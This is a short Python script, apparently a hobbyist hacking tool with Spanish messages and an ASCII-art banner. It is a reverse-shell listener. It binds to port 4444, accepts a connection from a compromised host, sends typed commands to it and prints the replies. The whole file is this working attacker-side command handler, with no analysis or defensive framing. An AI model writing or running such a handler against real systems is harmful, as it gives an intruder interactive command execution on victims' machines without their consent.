import socket
import sys 
import time
from colorama import Fore

def listen(ip,port):
    print(Fore.CYAN + """


       ,.
      /  `-._
     /       `.     ___            __
   ,'       _/ ,---'   `-.       ,'  `.
  /   /`---' \/           `--.  /      \
 /   |       /             _  `/  -.    `.
 \   |              ,.    /O\  \    \     \
  \   `.           /O \  '   `. `. / \    |
   `._  `-.       /   ,   .    ,  `.  \  ,'
      `-.        .   /     `--'     \  \/
         \        `-',d8o8b.        /
          \          dP'88`8b      /
           \  ,'`.     `YP'       |
            \/ .        |       | |
            /  |\       :       |/\
           /   | `.   ,:::     / \ \
          ,\       `-'`""'`.--'  )o )
         (o `.__,               / o/
          \ o   \_           ,-'o /
           \  o  o`-----.__,' o ,'
            `----. o  o  o  o ,'
                  `----------'

                  """ + Fore.RESET)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Escuchando en el puerto " + str(port))
    conn, addr = s.accept()
    print('Conexion inversa del host: ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input("$")

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

listen("",4444)
